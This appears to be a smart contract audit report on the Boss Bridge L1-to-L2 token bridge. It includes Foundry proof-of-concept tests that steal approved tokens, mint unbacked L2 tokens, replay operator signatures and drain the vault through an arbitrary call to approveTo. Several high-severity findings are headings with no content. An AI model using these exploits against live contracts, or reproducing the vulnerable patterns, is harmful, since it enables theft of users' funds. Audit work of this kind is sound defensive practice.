# Protocol Summary

The **Boss Bridge** is a mechanism designed to transfer the ERC20 token, referred to as the **Boss Bridge Token** (BBT), from **Layer 1 (L1)** to a **Layer 2 (L2)** network that is still under development. Since the L2 component is not yet complete, it was not included in the reviewed codebase.

## How the Bridge Works

- **Deposits**: Users can deposit BBT tokens, which are stored in a vault contract on L1. When a deposit is made, an event is triggered, and an off-chain system detects this event to mint the corresponding tokens on the L2 side.

- **Withdrawals**: The withdrawal process relies on **approved operators**, also known as **"signers"**. These off-chain services are responsible for verifying user withdrawal requests and signing the necessary data to allow token withdrawals. 

> **Note**: There is little-to-no on-chain mechanism for verifying withdrawals. The system heavily depends on the availability and trustworthiness of the operators to approve requests. If an operator is compromised or a signing key is leaked, the security of the entire protocol could be at risk.

## Security Considerations

The **Boss Bridge**'s security model depends on the integrity of the operators. A rogue operator or a compromised signing key could potentially undermine the entire protocol, as the withdrawal process lacks on-chain validation and relies almost entirely on off-chain operator signatures.

| **Bridge Owner** | The entity responsible for managing the bridge, including pausing/unpausing withdrawals and adding/removing operators within the `L1BossBridge` contract.           | If the owner's key is compromised or if they act maliciously, the entire bridge and its funds are at risk. |
| **User**         | An account that holds Boss Bridge Tokens (BBT) and interacts with the `L1BossBridge` contract to deposit or withdraw tokens.                                           | Users rely on the bridge to transfer BBT tokens but do not have direct control over withdrawal operations. |
| **Operator**     | Accounts approved by the bridge owner to sign withdrawal requests. Operators are responsible for verifying and approving withdrawals.                                 | If an operator's key is compromised or if they act maliciously, it can jeopardize the security of the bridge and its funds. |

## High 

### [H-1] Unauthorized Token Transfers via `L1BossBridge` Approval Exploit

The `depositTokensToL2` function is vulnerable, allowing malicious actors to transfer tokens from any account that has granted approval to the bridge contract.

The function permits anyone to specify a `from` address with an active token allowance to the bridge. An attacker can exploit this by transferring tokens from a victim's account (if the allowance is greater than zero) to their own address on L2 via the `l2Recipient` parameter.

```solidity
function testUnauthorizedTokenTransfer() public {
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);

    uint256 userTokenBalance = token.balanceOf(user);
    vm.startPrank(attacker);

    vm.expectEmit(true, true, true, true);
    emit Deposit(user, attackerInL2, userTokenBalance);

    tokenBridge.depositTokensToL2(user, attackerInL2, userTokenBalance);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), userTokenBalance);

    vm.stopPrank();
}

```

Consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
    if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
        revert L1BossBridge__DepositLimitReached();
    }
-   token.transferFrom(from, address(vault), amount);
+   token.transferFrom(msg.sender, address(vault), amount);

    // Our off-chain service picks up this event and mints the corresponding tokens on L2
-   emit Deposit(from, l2Recipient, amount);
+   emit Deposit(msg.sender, l2Recipient, amount);
}
```

### [H-2] Infinite Minting of Unbacked Tokens via Vault-to-Vault `depositTokensToL2` Calls

The `depositTokensToL2` function allows the caller to specify the `from` address, which determines the source of the tokens for the transfer.

Since the vault contract grants infinite approval to the bridge (as established in the contract's constructor), an attacker can exploit this by calling `depositTokensToL2` and transferring tokens from the vault back to the vault itself. This creates a scenario where the `Deposit` event can be triggered repeatedly, enabling the minting of unbacked tokens on L2.

Furthermore, the attacker could direct the minted tokens entirely to their own address on L2.

Proof of code

```solidity
function testVaultToVaultInfiniteMinting() public {
    vm.startPrank(attacker);

    uint256 initialVaultBalance = 500 ether;
    deal(address(token), address(vault), initialVaultBalance);

    vm.expectEmit(true, true, true, true);
    emit Deposit(address(vault), address(vault), initialVaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), initialVaultBalance);

    vm.expectEmit(true, true, true, true);
    emit Deposit(address(vault), address(vault), initialVaultBalance);
    tokenBridge.depositTokensToL2(address(vault), address(vault), initialVaultBalance);

    vm.stopPrank();
}
```

As suggested in H-1, consider modifying the `depositTokensToL2` function so that the caller cannot specify a `from` address.

### [H-3] Lack of replay protection in `withdrawTokensToL1` allows withdrawals by signature to be replayed

Users who want to withdraw tokens from the bridge can call the `sendToL1` function, or the wrapper `withdrawTokensToL1` function. These functions require the caller to send along some withdrawal data signed by one of the approved bridge operators.

However, the signatures do not include any kind of replay-protection mechanisn (e.g., nonces). Therefore, valid signatures from any  bridge operator can be reused by any attacker to continue executing withdrawals until the vault is completely drained.

As a PoC, include the following test in the `L1TokenBridge.t.sol` file:

```solidity
function testCanReplayWithdrawals() public {
    // Assume the vault already holds some tokens
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), address(attacker), attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);

    // Operator signs withdrawal.
    (uint8 v, bytes32 r, bytes32 s) =
        _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);

    // The attacker can reuse the signature and drain the vault.
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
    }
    assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
    assertEq(token.balanceOf(address(vault)), 0);
}
```

Consider redesigning the withdrawal mechanism so that it includes replay protection.

### [H-4] `L1BossBridge::sendToL1` allowing arbitrary calls enables users to call `L1Vault::approveTo` and give themselves infinite allowance of vault funds

The `L1BossBridge` contract includes the `sendToL1` function that, if called with a valid signature by an operator, can execute arbitrary low-level calls to any given target. Because there's no restrictions neither on the target nor the calldata, this call could be used by an attacker to execute sensitive contracts of the bridge. For example, the `L1Vault` contract.

The `L1BossBridge` contract owns the `L1Vault` contract. Therefore, an attacker could submit a call that targets the vault and executes is `approveTo` function, passing an attacker-controlled address to increase its allowance. This would then allow the attacker to completely drain the vault.

It's worth noting that this attack's likelihood depends on the level of sophistication of the off-chain validations implemented by the operators that approve and sign withdrawals. However, we're rating it as a High severity issue because, according to the available documentation, the only validation made by off-chain services is that "the account submitting the withdrawal has first originated a successful deposit in the L1 part of the bridge". As the next PoC shows, such validation is not enough to prevent the attack.

To reproduce, include the following test in the `L1BossBridge.t.sol` file:

```solidity
function testCanCallVaultApproveFromBridgeAndDrainVault() public {
    uint256 vaultInitialBalance = 1000e18;
    deal(address(token), address(vault), vaultInitialBalance);

    vm.startPrank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(address(attacker), address(0), 0);
    tokenBridge.depositTokensToL2(attacker, address(0), 0);

    bytes memory message = abi.encode(
        address(vault), // target
        0, // value
        abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
    );
    (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

    tokenBridge.sendToL1(v, r, s, message);
    assertEq(token.allowance(address(vault), attacker), type(uint256).max);
    token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
}
```

Consider disallowing attacker-controlled external calls to sensitive components of the bridge, such as the `L1Vault` contract.



### [H-5] `CREATE` opcode does not work on zksync era

### [H-6] `L1BossBridge::depositTokensToL2`'s `DEPOSIT_LIMIT` check allows contract to be DoS'd


### [H-7] The `L1BossBridge::withdrawTokensToL1` function has no validation on the withdrawal amount being the same as the deposited amount in `L1BossBridge::depositTokensToL2`, allowing attacker to withdraw more funds than deposited

### [M-1] Withdrawals are prone to unbounded gas consumption due to return bombs

During withdrawals, the L1 part of the bridge executes a low-level call to an arbitrary target passing all available gas. While this would work fine for regular targets, it may not for adversarial ones.

In particular, a malicious target may drop a [return bomb](https://github.com/nomad-xyz/ExcessivelySafeCall) to the caller. This would be done by returning an large amount of returndata in the call, which Solidity would copy to memory, thus increasing gas costs due to the expensive memory operations. Callers unaware of this risk may not set the transaction's gas limit sensibly, and therefore be tricked to spent more ETH than necessary to execute the call.

If the external call's returndata is not to be used, then consider modifying the call to avoid copying any of the data. This can be done in a custom implementation, or reusing external libraries such as [this one](https://github.com/nomad-xyz/ExcessivelySafeCall).

## Low

### [L-1] Lack of event emission during withdrawals and sending tokesn to L1

Neither the `sendToL1` function nor the `withdrawTokensToL1` function emit an event when a withdrawal operation is successfully executed. This prevents off-chain monitoring mechanisms to monitor withdrawals and raise alerts on suspicious scenarios.

Modify the `sendToL1` function to include a new event that is always emitted upon completing withdrawals.
